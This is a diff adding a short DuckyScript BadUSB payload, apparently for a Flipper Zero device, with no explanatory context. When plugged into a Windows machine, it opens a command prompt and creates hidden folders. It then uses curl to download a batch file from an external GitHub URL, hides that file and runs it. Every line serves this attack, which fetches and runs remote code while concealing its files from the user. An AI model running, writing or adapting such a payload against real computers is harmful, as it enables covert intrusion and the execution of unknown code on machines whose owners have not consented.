@@ -1,1 +1,33 @@
+DEFAULTDELAY 50
+
+GUI r
+STRING cmd
+ENTER
+
+STRING cd ../../
+ENTER
+
+STRING mkdir BadUsbExploits && attrib +h BadUsbExploits
+ENTER
+
+STRING cd BadUsbExploits
+ENTER
+
+STRING mkdir Python && attrib +h Python
+ENTER
+
+STRING cd Python
+ENTER
+
+STRING type nul > CheckPython.bat
+ENTER
+
+STRING curl https://raw.githubusercontent.com/Wojtek9388/Flipper-Zero-Exploits/refs/heads/main/Python/CheckPython.bat >> CheckPython.bat
+ENTER
+
+STRING attrib +h CheckPython.bat
+ENTER
+
+STRING start CheckPython.bat && exit
+ENTER
 
